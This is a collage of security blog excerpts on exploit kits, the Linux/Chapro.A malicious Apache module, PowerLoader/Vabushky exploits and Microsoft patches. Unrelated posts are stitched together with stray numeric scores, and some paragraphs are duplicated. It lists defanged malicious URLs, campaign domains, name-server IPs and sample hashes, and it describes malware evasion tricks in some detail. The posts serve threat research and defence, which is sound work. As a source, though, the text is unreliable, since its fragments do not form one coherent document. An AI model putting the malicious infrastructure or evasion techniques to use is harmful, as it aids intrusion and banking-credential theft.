In addition we’ve added a whole new protection layer. The new Layer0 called “Application Hardening” now includes protections such as DEP Enforcement, Anti-HeapSpraying and BottomUp ASLR Enforcement. The other protection layers have also been improved by including ROP protection and StackPivoting 64bit mitigations in Layer1, 64bit caller mitigations for Layer2 and new application behavior mitigations for Layer3. As an example of Layer3, we’ve added a mitigation for the much talked-about recent PowerPoint zero-day vulnerabilities CVE-2014-4114 and CVE-2014-6352. After some testing we saw that the mitigation suggested by Microsoft for EMET could cause system instabilities and conflicts with third-party applications. We have therefore designed a much more stable mitigation for these type of vulnerabilities.
This 1.05 version also introduces a 14-day trial mode. There are some other UI improvements that can be seen immediately, such as a re-designed shielded applications counter which counts unique instances of applications rather than total number of processes, traybar balloon messages when protection is stopped, or different UI designs depending on the build (Free vs Premium vs Corporate), among others.
Many things have also been improved, like the IPC communication between the service and the protection DLL, the 64-bit process communication and some improvements in the “other” custom shield protection profile among other things. Finally this build includes a bunch of bug fixes in all aspects of the product, from FPs, conflicts with third-party applications, UI bug fixes, counter fixes, and a DoS condition in the driver.
You may download and install Malwarebytes Anti-Exploit (MBAE) 1.05.1.1014 from the MBAE webpage: https://www.malwarebytes.org/antiexploit/
There is no need to uninstall the previous version. Simply install on top.
This slideshow requires JavaScript.",0.011197004560352997
Pedro Bustamante,0.009248799551532572
"P.S. Here’s a photo of the V3 award at the ceremony:
",0.011953105590917557
"Recent Internet Explorer Vulnerability Exploited in The Wild
A recently patched Internet Explorer vulnerability (CVE-2015-2419) has already made its way into the top exploit kit on the market, Angler EK, according to security firm FireEye. The flaw affects Internet Explorer version 6 all the way to 11 and was rated critical by Microsoft in its July 22nd security bulletin.
Malwarebytes Anti-Exploit successfully blocks this attack:",0.01577706229944764
"The Angler exploit kit keeps raising the bar higher and higher by not only adding the most potent vulnerabilities shortly after they are patched, but also by making it more difficult for security researchers to study the kit itself.
Angler uses a secret key exchange method to ensure that the infection will happen only once on the live machine being exploited. Efforts to replay the sessions later on using a packet capture will fail.
It’s interesting to note that the authors being Angler are not simply concentrating on Flash exploits, but also going directly for browser vulnerabilities. Indeed, given the recent attention the Flash Player has received, a slew of security updates have just been released, making exploitation more difficult.
The trend to go after browsers may get stronger as we saw recently a Firefox zero-day exploited in the wild and already a remote code execution in Microsoft’s newest browser, Edge.
We would like to thank Brad from MalwareTrafficAnalysis for sharing a reliable referer to test this new exploit.
",0.01266622309710308
"On a periodic basis, malicious cybercriminals spamvertise millions of emails attempting to trick end users into thinking that they’ve received a scanned document. Upon clicking on the links found in these emails, or viewing the malicious .html attachment, users are automatically exposed to the client-side exploits served by the latest version of the Black Hole Exploit Kit.
In this post, I will profile two currently circulating malicious campaigns. The first is mimicking a Xerox Pro printer, and the second is claiming to be a legitimate Wire Transfer. Both of these campaigns point to the same client-side exploits serving URL, indicating that they’ve been launched by the same cybercriminal/gang of cybercriminals.
More details: Sample screenshots of the spamvertised emails:",0.01377243779164894
"Client-side exploits serving URLs: hxxp://panalkinew.ru:8080/forum/links/column.php; hxxp://panalkinew.ru:8080/forum/links/column.php?rcgeyqil=0406080806&qkped=36&kwtgtko=3307093738070736060b&ucu=02000200020002
Spamvertised compromised URL used in the Wire Transfer themed campaign: hxxp://www.mm4management.com/indeaxo.htm
Upon loading, the URLs exploit CVE-2010-0188 in an attempt to drop a malicious PDF file on the affected host. The sample then drops additional malware.
Detection rate for a sample javascript obfuscation: MD5: 0a8a06770836493a67ea2e9a1af844bf – detected by 15 out of 43 antivirus scanners as Mal/JSRedir-M
Detection rate for the dropped malware: MD5: 194655f7368438ab01e80b35a5293875 – detected by 25 out of 43 antivirus scanners as Trojan-Ransom.Win32.PornoAsset.avzz
panalkinew.ru responds to the following IPs – 203.80.16.81, AS24514; 209.51.221.247, AS10297; 213.251.171.30, AS16276
Responding to the same IPs are also the following malicious domains part of the campaign’s infrastructure:
manekenppa.ru
kiladopje.ru
lemonadiom.ru
finitolaco.ru
fidelocastroo.ru
ponowseniks.ru
panasonicviva.ru
geforceexlusive.ru
limonadiksec.ru
linkrdin.ru
sonatanamore.ru
secondhand4u.ru
windowonu.ru
Deja vu! We’ve already seen one of these domains (sonatanamore.ru) used in the recently profiled “‘Regarding your Friendster password’ themed emails lead to Black Hole exploit kit” campaign, indicating that these campaigns have been launched by the same malicious party.
Name servers used in the campaign’s infrastructure:
ns1.panalkinew.ru – 62.76.186.190
ns2.panalkinew.ru – 84.22.100.108
ns3.panalkinew.ru – 50.22.102.132
ns4.panalkinew.ru – 213.251.171.30
ns1.manekenppa.ru – 85.143.166.170
ns2.manekenppa.ru – 132.248.49.112
ns3.manekenppa.ru – 84.22.100.108
ns4.manekenppa.ru – 213.251.171.30
ns1.kiladopje.ru – 85.143.166.170
ns2.kiladopje.ru – 132.248.49.112
ns3.kiladopje.ru – 84.22.100.108
ns4.kiladopje.ru – 213.251.171.30
ns1.lemonadiom.ru – 85.143.166.170
ns2.lemonadiom.ru – 132.248.49.112
ns3.lemonadiom.ru – 84.22.100.108
ns4.lemonadiom.ru – 213.251.171.30
ns1.finitolaco.ru – 85.143.166.170
ns2.finitolaco.ru – 132.248.49.112
ns3.finitolaco.ru – 84.22.100.108
ns4.finitolaco.ru – 213.251.171.30
ns1.fidelocastroo.ru – 85.143.166.170
ns2.fidelocastroo.ru – 132.248.49.112
ns3.fidelocastroo.ru – 84.22.100.108
ns4.fidelocastroo.ru – 213.251.171.30
ns1.ponowseniks.ru – 85.143.166.170
ns2.ponowseniks.ru – 132.248.49.112
ns3.ponowseniks.ru – 84.22.100.108
ns4.ponowseniks.ru – 213.251.171.30
ns1.panasonicviva.ru – 132.248.49.112
ns2.panasonicviva.ru – 84.22.100.108
ns3.panasonicviva.ru – 62.76.47.51
ns1.geforceexlusive.ru – 62.76.47.51
ns2.geforceexlusive.ru – 132.248.49.112
ns3.geforceexlusive.ru – 84.22.100.108
ns4.geforceexlusive.ru – 79.98.27.9
ns1.limonadiksec.ru – 62.76.46.195
ns2.limonadiksec.ru – 87.120.41.155
ns3.limonadiksec.ru – 132.248.49.112
ns4.limonadiksec.ru – 91.194.122.8
ns5.limonadiksec.ru – 62.76.188.246
ns1.linkrdin.ru – 85.143.166.170
ns2.linkrdin.ru – 132.248.49.112
ns3.linkrdin.ru – 84.22.100.108
ns4.linkrdin.ru – 79.98.27.9
ns1.sonatanamore.ru – 62.76.47.51
ns2.sonatanamore.ru – 132.248.49.112
ns3.sonatanamore.ru – 84.22.100.108
ns1.secondhand4u.ru – 85.143.166.170
ns2.secondhand4u.ru – 132.248.49.112
ns3.secondhand4u.ru – 84.22.100.108
ns4.secondhand4u.ru – 79.98.27.9
ns1.windowonu.ru – 85.143.166.170
ns2.windowonu.ru – 132.248.49.112
ns3.windowonu.ru – 84.22.100.108
ns4.windowonu.ru – 79.98.27.9
ns1.panalkinew.ru – 62.76.186.190
ns2.panalkinew.ru – 84.22.100.108
ns3.panalkinew.ru – 50.22.102.132
ns4.panalkinew.ru – 213.251.171.30
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.01190015983501036
"Malicious Apache module used for content injection: Linux/Chapro.A
More than half of all web servers on the Internet use Apache, so when we discovered a malicious Apache module in the wild last month, we were understandably concerned.",0.009281367154344244
18 Dec 2012 - 01:01AM,0.01186009845704794
"More than half of all web servers on the Internet use Apache, so when we discovered a malicious Apache module in the wild last month, we were understandably concerned.",0.013298379688665873
[Update: David Harley has published a blog post here with additional information about this malware.],0.014580383757305193
"More than half of all web servers on the Internet use Apache, so when we discovered a malicious Apache module in the wild last month, being used to inject malicious content into web pages displayed by compromised web servers, we were understandably concerned. Our concern deepened when we discovered that this malware was being used in a scheme to steal banking credentials.",0.010199321815873907
"At first, we wondered if this code might be related to the Linux/Snasko.A rootkit reported to the Full-Disclosure mailing list and then analyzed by CrowdStrike and Kaspersky but it turns out this is a completely different beast.",0.012868161906759434
"The malicious Apache module we have analyzed is detected by ESET as Linux/Chapro.A. the primary purpose of which is to inject malicious content into web pages served up by the compromised server (as diagrammed on the right where an iframe is injected, but it could be malicious JavaScript or something else).",0.010528324092314634
"Although the module can serve any type of content, in this specific case the final payload, achieved via the iframe injection, was installation of a variant of Win32/Zbot, which is commonly used to steal banking information from infected systems.",0.010736487696512254
"We also found that this module has a couple of interesting capabilities designed to reduce its chances of being spotted by system administrators. In addition to analyzing the malicious Apache module, we were able to analyze the malicious content it was serving.",0.01055805264443721
"In this analysis, we will present the characteristics of Linux/Chapro.A. We will also give an overview of the exploit kit used to install malware, and the final Win32/Zbot payload.",0.010982321590715105
Linux/Chapro.A Characteristics,0.009315057089018808
The Linux/Chapro.A malicious Apache module is an x64 Linux binary. This malware makes use of only one obfuscation technique. It uses an XOR loop with a 12 byte long key to encode most of the strings.,0.009336480031475025
"The program has many capabilities to evade detection by system administrators. Before serving malicious content to a visitor, multiple checks will be performed.",0.009457106408029547
"First, Linux/Chapro.A checks the web browser’s user agent for known bots as well as web browsers that are not likely to be vulnerable to the exploits used to infect the target system. If the web browser visiting the page has a user agent string that contains keywords known to be used by web crawlers, the malware will not be served the malicious content. The following figure shows some of the keywords used by the bot.",0.010725256427167151
"Linux/Chapro.A will also inspect all active SSH sessions on the Linux system on which it is running to determine the IP addresses being used by them. If a visitor browses a page using any of the same IPs involved in a SSH connection, it will not be served the malicious content. This helps hide the malicious content from system administrators, web developers and others who might be working on the web server",0.007725308497379069
"Before injecting the malicious iframe into the web content sent by the server, Linux/Chapro.A sets a cookie in the visiting web browser. Malicious content will not be served if the visiting browser already had that cookie set. This helps ensure that visitors will not receive malicious content over and over again, making it more difficult to determine how a system was infected.",0.009764256996750986
"Finally, Linux/Chapro.A maintains a list of IP addresses that have been served malicious content. If a user visits an infected website twice from the same IP address; it will only receive the malicious content once. This provides a second, additional method to make the path of infection more difficult to determine.",0.007144115038796861
Injected Content,0.009365212888489238
"The main purpose of Linux/Chapro.A is to inject iframes into webpages served by the Apache webserver to which it is attached. To do so, the malware sends an HTTP POST request to its command and control server every 10 minutes. The following figure shows one such HTTP POST request.",0.01059294729963467
"At the time of our analysis, the malicious command and control server was being hosted in Germany. It has recently gone offline.",0.012363670381718816
"The request is simple; it only includes the version of the malware and the operating system it is running on.  The command and control server will respond to the query with the iframe to be injected by the malicious apache module. The iframe is encoded using base64 and XOR. If a visitor does not fall into any of the blacklists detailed in the previous section, it is served the iframe downloaded from the command and control server.",0.009483826437234999
The figure below shows the HTML code for an iframe sent by Linux/Chapro.A. The iframe is positioned outside of the usual browser display area in order to avoid being seen by the user.,0.009408702436582539
Exploit Kit,0.007213773932165268
"Based on our analysis and descriptions from this article, we are confident the iframe injected by Linux/Chapro.A points to a “Sweet Orange” exploit pack landing page. At the time of our analysis, the exploit pack was being hosted in Lithuania. The pack tries to exploit the following vulnerabilities found in modern web browsers and plugins:",0.008122484862667423
"CVE-2012-5076: Java JAX-WS Class Handling
CVE-2012-4681: Java getField Method Class Invocation Privilege Escalation
CVE-2006-0003: Internet Explorer MDAC
CVE-2010-0188: Adobe Reader LibTiff Integer Overflow",0.019468635250726507
"If the exploit pack is able to exploit one of the vulnerabilities it has exploits for, the final payload is executed.",0.00956423581693111
Attack Payload,0.008057076702049581
"The final purpose of the attack we have investigated is to install a variant of Win32/Zbot, also known as ZeuS, which has been widely used for years to steal banking-related information. In this case, the Win32/Zbot variant targets European and Russian banking institutions. The screenshot below shows a form used by a bank to give customers online access to account information.",0.012068078601247145
"Apparently this bank is aware that it has been targeted by criminals attempting to obtain customer PIN code and CVC/CVV code information. Indeed, a specific warning is shown on its customer login form. However, when the login page is visited from a compromised host, this warning is removed by the malware, as you can see below.",0.012115317819215599
"Once the user has logged into his account, the malware will inject a pop-up asking for the CVV code for his card, which is exactly the behavior outlined in the warning on the original login form. The malware will then try to send the user credentials, along with the CVV, to the botnet operator.",0.01132905417542418
Conclusions,0.009304842168474714
"The Linux/Chapro.A attack has not been publicly documented in the past. Our telemetry systems did not report other installation of this malicious Apache module in the wild. While the intent of injecting iframes into served webpages is the same as the rootkit analyzed by Crowdstrike and Kaspersky, we confirm this is not the same malware family. On the other hand, this malware has many similarities to something discussed on Russian underground forums as exposed by Dancho Danchev.",0.009588849315776526
"While we have not witnessed any other installations of Linux/Chapro.A in the wild, we have observed thousands of users accessing the Sweet Orange exploit pack before we blocked access to this server in our products. ESET blocked the exploit attempts through generic detection, even before additional protection was added with URL blocking.",0.00889954515093705
"The attack described in the present analysis shows the increased complexity of malware attacks. This complicated case spreads across three different countries, targeting users from a fourth one, making it very hard for law enforcement agencies to investigate and mitigate. It is not clear at this point in time if the same group of people are behind the whole operation, or if multiple gangs collaborated, perhaps with one to drive traffic to the exploit pack and sell the infected computers to another gang operating a botnet based on Win32/Zbot.",0.012439064224768037
Acknowledgements,0.0103658076566161
"We would like to thank the following researchers for their contribution in this research:Jean-Ian Boutin, François Chagnon, Sébastien Duquette, Aleksander Matrosov.",0.017009077161522668
Analyzed Files,0.011072675335039861
The following listing provides the MD5 hashes for the files involved in our research:,0.010518596246157585
"Description
MD5 Hash",0.009545792232964256
"Linux/Chapro.A
e022de72cce8129bd5ac8a0675996318",0.008488209613309872
"Injected iframe
111e3e0bf96b6ebda0aeffdb444bcf8d",0.007689960572864196
"Java exploit
2bd88b0f267e5aa5ec00d1452a63d9dc",0.006276855522121538
"Zeus binary
3840a6506d9d5c2443687d1cf07e25d0",0.008131666347106825
"Pierre-Marc Bureau
Security Intelligence Program Manager
",0.010256198476948919
"Update updates
So Patch Tuesday has been and gone, and many of you will already have updated automatically. If you haven’t, do. there seems to be a curious complacency in some quarters about Powerpoint clientside exploits and targeted attacks, but a lot of dross gets passed around as slide-decks. For example, many an old hoax has been given",0.010714387823118177
13 May 2009 - 01:02AM,0.011538852963688728
"So Patch Tuesday has been and gone, and many of you will already have updated automatically. If you haven’t, do. there seems to be a curious complacency in some quarters about Powerpoint clientside exploits and targeted attacks, but a lot of dross gets passed around as slide-decks. For example, many an old hoax has been given",0.010756078703190841
"So Patch Tuesday has been and gone, and many of you will already have updated automatically. If you haven’t, do. there seems to be a curious complacency in some quarters about Powerpoint clientside exploits and targeted attacks, but a lot of dross gets passed around as slide-decks. For example, many an old hoax has been given a new lease of life by distribution as a PPT or PDF, and most malware distribution feeds on credulity. Hmm. That almost sounds like a paper I’m writing. :)",0.01266066846239855
"Talking of PDFs, Adobe yesterday published a new security bulletin. addressing the vulnerabilities labeled as CVE-2009-1492 and CVE-2009-1493 by http://cve.mitre.org. This update is described by Adobe as critical, and as Adobe auto-updating is not very consistent, Adobe users need to check that page. (And the other links, if you want more information: the bulletin isn’t very detailed and is a bit sparse on links.)",0.009811011377662049
"CVE-2009-1492 affects Adobe Reader 9.1 and Acrobat 9.1, and earlier, and could allow a remote attacker to take control of an affected system.  CVE-2009-1493 only seems to affect Adobe Reader for UNIX and is also remotely exploitable.",0.011630139166592501
"Adobe recommends update to versions 9.1.1, 8.1.5, or 7.1.2.  It also says it expects to provide updates for Adobe Reader 7 and Acrobat 7 before the end of June.",0.015308029365597609
"Adobe must feel that the entire anti-malware industry is out to get it at the moment (not made up for by its popularity with the bad guys), so it’s nice to be able to say that at least they’re making updates available before they’re aware of exploits. A little more info on vulnerabilities, at least once they’re addressed, and more consistency on updating would be nice, though.",0.014248620252197197
Adobe users might want to subscribe to the RSS feed for the Adobe Product Security Incident Response Team blog.,0.01578225347271056
"Since everyone knows there is, never was, and never could be any OS X – targeting malware, I won’t mention the impressive volume of updates released by Apple yesterday. I guess my MacBook is going to be busy with automatic downloads for a while when I get back to it tomorrow.",0.016127943164305214
"David Harley BA CISSP FBCS CITP
Director of Malware Intelligence
",0.011847413796831296
"The Powerloader 64‑bit update based on leaked exploits
A few months ago on this blog I described PowerLoader functionality - including an interesting way for privilege escalation into the explorer.exe system process. The leaked PowerLoader code is also used in other malware families.",0.01002476657339757
27 Aug 2013 - 11:15AM,0.011925493743557447
A few months ago on this blog I described PowerLoader functionality – including an interesting way for privilege escalation into the explorer.exe system process. The leaked PowerLoader code is also used in other malware families.,0.010761460999716976
"A few months ago on this blog I described PowerLoader functionality including an interesting way for privilege escalation into the explorer.exe system process. The leaked PowerLoader code is also used in other malware families. For example the Win32/Gapz dropper is based on leaked PowerLoader code. In August 2013 we have tracked a new modification of PowerLoader for 64-bit operating systems (detected by ESET products as Win64/Vabushky.A). This modification uses three exploits for local privilege escalation (LPE): MS13-053 (CVE-2013-3660), MS12-041 (CVE-2012-1864), and MS12-042 (CVE-2012-0217). Use of this set of LPE exploits was not previously observed in PowerLoader samples or by related malware families.",0.013688687314124093
"Win64/Vabushky is a good example of how cybercriminals update their projects with code based on leaked Carberp sources. Two 64-bit exploits (CVE-2012-1864 and CVE-2012-0217) from the updated PowerLoader update are based on the leaked code. Before this leak into the public domain, 64-bit exploitation code for these vulnerabilities was not available. It’s also worth noting that the PowerLoader code was leaked in April 2013 and initiated the wave of distribution of droppers based on PowerLoader leaked code.",0.012223234574438524
"The dropper for Win64/Vabushky is packed by MPRESS because this packer is one of the few free products that support x64 PE32+ files. After unpacking, the dropper extracted the original PE32+ header with the time of compilation:",0.01738582668090971
"All binaries include a payload compiled at the beginning of August, according to time stamp data. PowerLoader’s export table  also shows a few changes after unpacking when compared to the older version:",0.008927317072548235
The most interesting part of latest changes provided concern the exploitation code for local privilege escalation.,0.010495650847339388
LPE exploits update,0.00806713240497281
After code injection into explorer.exe the modified version of PowerLoader tried to execute following local privilege escalation exploits into trusted process address space:,0.00822510634862994
This set of LPE exploits can bypass some types of sandbox technologies used by security products. This is because direct manipulation of some kernel-mode structures is possible from user-mode using legitimate WinAPI calls.,0.008896249144132118
CVE-2013-3660,0.00929935398150561
"Google researcher Tavis Ormandy discovered the MS31-053 vulnerability in March and exploitation details were disclosed in May. The patch only became available with July’s patch Tuesday. Before this modified version of PowerLoader, I hadn’t seen a 64-bit version of MS13-053 exploit in-the-wild. Only an x86 version of proof of concept code has been seen made available publicly, but PowerLoader uses 64-bit exploitation code. There is a good description of the way in which this vulnerability is exploited in the VUPEN blog.",0.014659447353315924
Before the start of the exploitation process a second desktop is created for hiding visible artifacts by manipulating GDI objects.,0.01394503599754171
The main exploitation code for CVE-2013-3660 is presented in the following figure:,0.007235375976349601
The shellcode which executed by nt!NtQueryIntervalProfile() looks like this:,0.01193514580841315
"This exploitation code does not work for the 64-bit MS Windows 8 platform because it cannot bypass the Intel SMEP (Supervisor Mode Execution Protection) technology in modern CPU’s (for which support has been provided since the Ivy Bridge line of processors). Microsoft only started to support SMEP with Windows 8 and upwards. This technology blocks attempts to execute code from user-mode memory pages into kernel-mode. A good description of Intel SMEP as exploit protection technology can be found here. The SMEP technology in Windows 8 for x64 can be bypassed using a ROP (Return-Oriented Programming) technique. However, Intel announced the new protection technology SMAP (Supervisor Mode Access Prevention). Intel’s SMAP blocks attempts to read memory pages from user-mode into kernel-mode. SMAP and SMEP were developed to prevent exploitation of NULL pointer dereferences in kernel-mode but SMAP is not supported in Microsoft operating systems yet.",0.023222421148068495
CVE-2012-0217 and CVE-2012-1864,0.009910257053213578
The CVE-2012-0217 and CVE-2012-1864 exploitation code is based on leaked Carberp sources. The 64-bit versions of CVE-2012-1864 had never been made public before the source code leakage. The exploitation code for CVE-2012-0217 released on public doesn’t work reliably on 64-bit versions of operating systems. Neither exploit will work on Microsoft Windows 8 because of the restricted vulnerability of the platform. After observing the similarity to leaked Carberp source code I checked compiled exploit binaries found in the leaked archive. In both compiled exploits I found the same path to the build directory.,0.011997683880643595
This finding points to the same developer and seller for these exploits. The exploitation code for CVE-2012-0217 is different in many respects to the publicly available Proof of Concept exploits. The leaked exploit works more reliably and supports 64-bits operating systems.,0.009187577936756841
I’m going to check similarities in the code from the PowerLoader modification and the leaked exploit for CVE-2012-0217. The following flow graph shows the similarity of basic structural blocks (PowerLoader code on the left side):,0.00924480846618303
It looks to be pretty much the same structure. All the differences are found only in additional debugging code which is not included in PowerLoader modification. Also there are some specific techniques for making the exploitation more stable that look exactly the same.,0.011659098328652417
This code provides modifications in nt!HalDispatchTable for avoiding 100% CPU activity with multiple threads in exploitation process.,0.011378420639070463
"The same thing was found with exploitation code for CVE-2012-1864 vulnerability. This exploit has never before been publicly available either. CVE-2012-1864 was discovered by Tarjei Mandt from Azimuth Security. The vulnerability details were disclosed on the slides “Smashing the Atom” at the Recon conference in June 2012 but exploitation code was not released to the public. The exploit code from PowerLoader looks more optimized and doesn’t have debugging code with console output. For example, as seen in this code (disassembly code from PowerLoader is the second image):",0.007578302701927275
CVE-2012-0217 and CVE-2012-1864 are good examples of exploits that make it possible to bypass sandboxes in security software. Both of these exploits can manipulate kernel-mode structures from user-mode using standard WinAPI functions. A nice description of vectors for bypassing sandboxes using these types of vulnerabilities is presented in the research report “Application Sandboxes: A Pen-Tester’s Perspective” by Bromium Labs.,0.010301409312160725
The Payload,0.008012513730758397
"After successful PowerLoader execution and privilege escalation, the ransomware (Win64/Vabushky.A) was downloaded in order to infect the system. Earlier this week my colleague Jean-Ian Boutin discussed another example of ransomware in the blog post “Nymaim – Obfuscation Chronicles”. The downloaded file was executed once escalated privileges were achieved to SYSTEM. The Win64/Vabushky installer uses the trick with a self-generated legitimate certificate and the following installation to the local trust store as a ROOT CA and TrustedPublisher. The following code shows this technique:",0.00809642530259258
"This trick is not new and was mentioned in the blog post “The “Hikit” Rootkit: Advanced and Persistent Attack” by Mandiant. Also, during the installation process modifications are made to Boot Configuration Data (BCD) so as to activate test-signing policy for loading the unsigned driver module. The next figure presents registry keys with system configuration to allow the malicious driver to load (safeboot with various options is covered too):",0.01014851086788382
"The next steps are to install the malicious driver for locking the system and displaying a demonstration screen with the picture downloaded from the following URL’s, hardcoded into malicious code:",0.007479457560621072
After successful infection the locked desktop screen looks like this:,0.010262003519811214
The user-mode part of Win64/Vabushky also encrypts the user’s files using the Microsoft CryptoAPI and uses the .crypted file extension for encrypted files. The driver code uses standard tricks for locking that don’t merit further discussion in this blog.,0.008976103825210857
Conclusion,0.008171308922719556
"The Win64/Vabushky dropper uses an interesting modification to the PowerLoader code. However the PowerLoader modifications are based on leaked LPE exploits for 64-bit operating systems from Carberp code. All modules and components dropped by Win64/Vabushky target x64 versions of Microsoft Windows. Only one exploit, CVE-2013-3660, can attack MS Windows 8. However the exploitation code does not work for the 64-bit version of Windows 8 because it can’t bypass Intel SMEP technology. Microsoft is implementing better kernel-mode protection on Windows 8, making x64 exploits for this operating system more expensive. These security mechanisms can be bypassed in such cases with targeted attacks but this adds up to an expensive exploitation technique for run-of-the-mill cybercriminals.",0.016375244429696068
Special thanks to R136a1 who reported the new modification of PowerLoader.,0.010946510284392641
"Aleksandr Matrosov, Security Intelligence Team Lead",0.010083666225937482
SHA1 hashes for analyzed samples:,0.00964836368755806
Win64/Vabushky.A (dropper)        – 110e23ce497d6cd1fd3dc570e50cd701c612b7ba,0.008252578422911161
Win64/Vabushky.A (driver installer)    – 62a53ff68d1c862c9c68fb577b06fa261ef573e4,0.007784531229291125
"Win64/Vabushky.A (driver)        – 9434792df305f59a7b9deb99dd8b2617942513b0
",0.007361831402036612
First Patch Tuesday of 2021 brings fix to Windows Defender bug already being exploited,0.008201034376264404
Remote code execution vulnerability in Windows' built-in malware protection allows an attacker to execute code when a crafted file is scanned—one of seven critical bugs addressed in Microsoft's January fix release.,0.013149924468664143
"Written by
Sean Gallagher",0.009425424605690402
"January 12, 2021",0.01079419012395666
SophosLabs Uncut CVE-2021-1647 CVE-2021-1709 Microsoft Windows Defender Patch Tuesday,0.00956567203074088
"It’s the first Patch Tuesday of the New Year, bringing 83 new security fixes to Microsoft products—a relatively quiet month compared to many last year. Only seven of the vulnerabilities fixed in today’s release are as Critical—all of them remote code execution bugs. And one of those vulnerabilities is being actively exploited:  CVE-2021-1647, a bug in Windows Defender, Microsoft’s built-in anti-malware software.
The Defender vulnerability allows remote code execution, triggered when a crafted file is scanned by Defender.  An error in Defender’s handling of how it parses section information structures in certain executable files can result in the execution of code embedded in a scanned file. This would allow attackers to remotely execute code by sending a file in any way that triggers a Windows Defender scan. Since this is already being exploited, CVE-2021-1647 is an essential patch for many Windows users—the only short-term mitigation would be to disable Windows Defender. Fortunately, Sophos Windows end-point security customers have already done this, as installing end-point security software deactivates Defender.
A less critical, but likely to be exploited vulnerability is CVE-2021-1709, a bug in Windows Win32k component that could be used by attackers to gain escalation of privilege for malicious code execution. The bug, related to how Win32K processes handle private Device Context (DC) objects, allows an attacker to force Win32k to free the same DC object twice during the process cleanup. This results in memory corruption, which—if successful—would allow an attacker to control objects in kernel memory that could result in code execution with the highest privilege. However, this bug can only be exploited locally via interactive user access.
Click to enlarge
A breakdown by type and product of the vulnerabilities fixed in Microsoft’s January patch release. (click to enlarge)
More reasons to patch
All of the remaining “Critical” vulnerabilities are remote code execution bugs. Five of them (CVE-2021-1658, CVE-2021-1660, CVE-2021-1666, CVE-2021-1667, and CVE-2021-1673) are Remote Procedure Call (RPC) runtime bugs. Two are video-related—one (CVE-2021-1643) in Windows’ HEVC Video Extensions, and another (CVE-2021-1688) in the Microsoft DTV-DVD Video Decoder. Another, CVE-2021-1665,  is in the GDI+ graphics library.
The final one is a memory corruption bug in the Microsoft Edge browser. The vulnerability, CVE-2021-1705, is HTML-based. But while the HTML-based attack can cause memory corruption, it would be difficult to leverage that into remote code execution.
Beyond the critical bugs, the RPC runtime had five more vulnerabilities addressed in this month’s patch release, for a total of ten. Four of them (CVE-2021-1664, CVE-2021-1671, CVE-2021-1700, and CVE-2021-1701) are additional remote code execution bugs, while one (CVE-2021-1702) results in elevation of privilege.
SharePoint has six problems patched this month, including one rated as more likely to be exploited: a remote code execution vulnerability (CVE-2021-1707) based on abuse of SharePoint’s SafeControl assembly mechanism for trusted ASPX and “Web Part” components. It requires an authenticated user with default access to execute, but can execute code on the server with the permissions of the SharePoint service account. The other SharePoint issues are two spoofing vulnerabilities (CVE-2021-1641 and CVE-2021-1717), two elevation of privilege bugs (CVE-2021-1712 and CVE-2021-1719), and one server tampering vulnerability (CVE-2021-1718)—all rated as less likely to be exploited.
Another big source of bug fixes this month was Windows’ Client Side Cache (CSC) Service, with seven vulnerabilities (CVE-2021-1652, CVE-2021-1653, CVE-2021-1654, CVE-2021-1655, CVE-2021-1659, CVE-2021-1688, and CVE-2021-1693) which could potentially be used by attackers for elevation of privilege.
Rounding out the top bug sources is Windows’ WalletService, with four escalation of privilege vulnerabilities (CVE-2021-1681, CVE-2021-1686, CVE-2021-1687, and CVE-2021-1690).
Sophos protection",0.01184952162922015
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation:,0.007806399932861918
"CVE
SAV
IPS",0.009183097362180814
"CVE-2021-1647
Exp/20211647-A
SID:2304750",0.011727737161543295
CVE-2021-1707,0.009554579309024591
SID:2304754,0.008011867566794617
"Sophos aims to add detections for critical issues, based on the type and nature of the vulnerabilities, as soon as possible and where we have been given sufficient information to be able to do so. In many cases, existing detections in endpoint products such as Intercept X will catch and block exploit attempts without the need for updates.",0.0089820509245917
≈,0.008910712288718647
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Spammers leverage news of a new Pope and other world events
Major world events always bring with them an upsurge in related spam and the election and inauguration of a new Pope is no exception.",0.022504554253126807
22 Mar 2013 - 01:16PM,0.012290869136490024
Major world events always bring with them an upsurge in related spam and the election and inauguration of a new Pope is no exception.,0.021211751684502844
Major world events always bring with them an upsurge in related spam and the election and inauguration of a new Pope is no exception.,0.021211751684502844
"Since Pope Francis was elevated to the head of the Catholic Church, several observers have noted an increase in fake news spam, designed to fool people into clicking on malicious links. For example, Dynamoo’s Blog reports malware being spread with Pope-related messages made to look like they are from CNN, using these headlines:",0.01940374755732821
"“Opinion: New Pope Sued For Not Wearing Seat Belt In Popemobile”
“Opinion: Can New-Pope Benedict be Sued for the Sex Abuse Cases?”",0.017361372649720708
Both contain links to the “stories” which in fact download malware.,0.019119159772785888
"Meanwhile, in other news, fake BBC alerts on the recent Cyprus financial crisis have been circulating with links that go to a site booby-trapped with the Blackhole exploit kit (hxxp://go-my.ru/cyprus_news.html). The page is detected by ESET as a phishing site and users are protected. The malware uses the latest Java exploit CVE-2013-0431 and ESET detects the samples as Win32/Cridex.AA and Java/Exploit.Agent.NMK.",0.012313833832459653
"Spam like this makes one nostalgic for the days when all the spammer wanted recipients to do was buy something.
",0.016413678967657885
"Ever since we exposed and profiled the evasive, multi-hop, mass iframe campaign that affected thousands of Web sites in November, we continued to monitor it, believing that the cybercriminal(s) behind it, would continue operating it, basically switching to new infrastructure once the one exposed in the post got logically blacklisted, thereby undermining the impact of the campaign internationally. Not surprisingly, we were right. The campaign is not only still proliferating, but the adversaries behind it have also (logically) switched the actual hosting infrastructure. Let’s dissect the currently active malicious iframe campaign that continues to serving a cocktail of (patched) client-side exploits, to users visiting legitimate Web sites.",0.012726975341761704
Sample screenshot of one of the malicious scripts:,0.008339273871394881
"Redirection chain: harshimadhaparia.com/libraries/domit/domit/all2.php -> roiauctionsstore.com/templates/beez/1.php -> hxxp://www3.hotzofix.kjyg.com or hxxp://www3.judtn3qyy1yv-4.4pu.com -> hxxp://www1.gtyg4h3.4pu.com/i.html -> hxxp://www1.gtyg4h3.4pu.com/nnnnvdd.html -> hxxp://www1.gtyg4h3.4pu.com/pdfx.html -> hxxp://www1.gtyg4h3.4pu.com/taftaf.html -> hxxp://www1.gtyg4h3.4pu.com/fnts.html -> find-and-go.com/?uid=10088&isRedirected=1
Domain names reconnaissance:
hxxp://www3.judtn3qyy1yv-4.4pu.com – 188.116.34.246
hxxp://www1.gtyg4h3.4pu.com – 188.116.34.246
